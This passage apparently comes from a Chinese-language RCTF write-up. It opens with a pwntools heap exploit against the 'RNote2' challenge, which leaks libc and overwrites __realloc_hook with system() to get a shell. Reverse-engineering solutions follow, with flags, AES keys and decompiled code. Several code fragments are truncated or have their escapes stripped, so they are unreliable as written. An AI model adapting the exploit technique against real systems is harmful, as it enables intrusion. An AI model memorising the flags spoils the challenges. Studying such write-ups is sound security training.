        p.send(str(idx) + 'n')
        p.recvuntil('expand?')
        p.send(str(length) + 'n')
        p.recvuntil('expand')
        p.send(content)
    p = process('./RNote2')
    New(p, 0xe0, 'A' * 0xe0)
    New(p, 0x10, '/bin/shx00n')
    Delete(p, 1)
    New(p, 0xf0, 'C' * 0xf0)
    New(p, 0xf0, 'D' * 0xf0)
    New(p, 0xf0, 'E' * 0xf0)
    Delete(p, 2)
    New(p, 0x100, 'F' * 0x100)
    Delete(p, 2)
    New(p, 0x10, 'n')
    List(p)
    p.recvuntil('4.n')
    p.recvuntil('content: ')
    libc_base = u64(p.recv(6).ljust(8, 'x00')) - 0x398b0a
    log.info('libc_base: ' + hex(libc_base))
    realloc_hook = libc_base + 0x398ae8
    system_addr = libc_base + 0x3f460
    New(p, 0xc8, 'G' * 0xc8)
    Expend(p, 5, 0x10, 'xf0' * 0x10)
    New(p, 0x90, 'H' * 0x90)
    New(p, 0x40, 'I' * 0x90)
    Delete(p, 6)
    Delete(p, 2)
    payload = ''
    payload += 'J' * 0xa0
    payload += p64(0x00)
    payload += p64(0x40)
    payload += p64(0x00) * 2
    payload += p64(realloc_hook)
    New(p, 0xc8, payload)
    Edit(p, 5, p64(system_addr) + 'n')
    p.recvuntil('choice:')
    p.send('9n')
    p.recvuntil('choice:')
    p.send('5n')
    p.recvuntil('expand?')
    p.send(str(1) + 'n')
    p.recvuntil('expand?')
    p.send(str(1) + 'n')
    p.interactive()
**RE**
**baby_flash**
Category:RE
一个 C++ 编译到 Flash 的题目. 流程很简单, 就一个 'strcmp', 然而是自己写的并不是从 string.h 引入的. 这个 strcmp
会跳过第一个参数的一些字符, 所以找到的字符串并不是真正的 flag.
反编译 swf 文件推荐使用 JPEXS Free Flash Decompiler. 使用 FFDec 打开 swf 后, 翻到 MyCPP.check
即可看到主逻辑(在 com.adobe.flascc.Console 类中调用), 其中调用了 F_strcmp, 再找到 C_Run.F_strcmp
即可找到 strcmp 的反编译代码. 它看上去类似汇编, 有ebp, 而判断语句, 循环语句已经被 FFDec 给转换成了 while 和 if,
比直接看汇编要容易的多. si, li等操作就是直接操作内存.
       public function F_strcmp() : void
       {
          // method body index: 390 method index: 510
          var ebp:* = 0;
          var i2:int = 0;
          var esp:* = int(ESP);
          ebp = esp;
          esp = int(esp - 44);
          si32(int(li32(ebp)),ebp - 4);
          si32(int(li32(ebp + 4)),ebp - 8);
          si32(int(li32(ebp - 4)),ebp - 24);
          si32(int(li32(ebp - 8)),ebp - 28);
          si32(2,ebp - 32);
          si32(3,ebp - 36);
          si32(0,ebp - 40);
          si32(0,ebp - 44);
          while(int(li8(int(li32(ebp - 24)))) != 0)
          {
             if(int(li8(int(li32(ebp - 28)))) == 0)
             {
                break;
             }
             var i1:int = li8(int(li32(ebp - 28)));
             if(int(li8(int(li32(ebp - 24)))) == i1)
             {
                var i0:int = li32(ebp - 40);
                i2 = 1;
                if(i0 != int(int(li32(ebp - 32)) 
    #include 
    #include 
    int strcmp(const char* s1, const char* s2) {
        char* p1 = (char*)s1;
        char* p2 = (char*)s2;
        int a = 2, b = 3, i = 0, t = 0;
        while (*p1 && *p2 && *p1 == *p2) {
            if (i++ == a*2) {
                p1++;
                t = a + b;
                a = b;
                b = t;
            }
            p1++;
            p2++;
        }
        return *p1 - *p2;
    }
    void check() __attribute__((used,
        annotate("as3sig:public function check(src:String):void"),
        annotate("as3package:MyCPP")));
    void check()
    {
        const char *flag = NULL;
        AS3_MallocString(flag, src);
        puts(flag);
        if (strcmp("RCTF{_Dyiin9__F1ash__1ike5_CPP}", flag) == 0) {
            puts("Right!");
        } else {
            puts("Try again!");
        }
    }
    int main()
    {
        // RCTF{Dyin9_F1ash_1ike5_CPP}
        puts("press Enter to input your flag.");
        return 0;
    }
**actually_cpp**
Category:RE
解题思路大致与 baby_flash 相似, 只不过主逻辑使用了 AES 加密明文与已有数据比较.
这里声明的 key 和 iv 会被后面的 brainfuck 修改.
有两种解法, 一是修改 bytecode 将 encrypt 改为 decrypt 然后修改输出就能直接解出 flag.
另外一种是模拟 brainfuck 的代码将 key 和 iv 修改后再解密也能拿到 flag. iv 的修改容易被人忽略, 需要细心.
    void check()
    {
      const char *enc = "xd5x18x61x03x1ex1cx95x3ax62xc2x93x8bx39x62x35xb1xf3x64x94x2fx33x95x42x23xd3x6cx26x88xabx2ax3fx47x94x28xb4x46xa5x09x04x21xacx1fx82xbaxb4xb3x28x4exc0xbcxefx53xfcx43x31x5cxdax7cx83xd0xfax90xb5x9f";
      const char *flag = NULL;
      AS3_MallocString(flag, src);
      puts(flag);
      uint8_t key[] = {0x38, 0x6b, 0x27, 0x89, 0x1d, 0xc9, 0x8b, 0xb9, 0x13, 0x57, 0xae, 0x7d, 0xbe, 0x90, 0x09, 0xe0};
      uint8_t iv[]  = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f};
      int flen = strlen(flag);
      brainfuck(">>>>>+++++>>++
    #include 
    typedef struct _context
    {
        unsigned int unkonwn1;
        unsigned int *sn;
        int len;
        unsigned int key_a;
        unsigned int key_b;
        unsigned int key_table[32];
        unsigned int key_d;
        unsigned int key_e;
    }context;
    unsigned int shrl(unsigned int a1, char a2)
    {
        return (a1 > (32 - a2));
    }
    unsigned int __stdcall inner_log(int a1)
    {
        return (unsigned int)(a1 > (32- (unsigned __int64)(signed __int64)(5));
    }
    unsigned int shlr(unsigned int a1, char a2)
    {
        return (a1 >> a2) | (a1 len)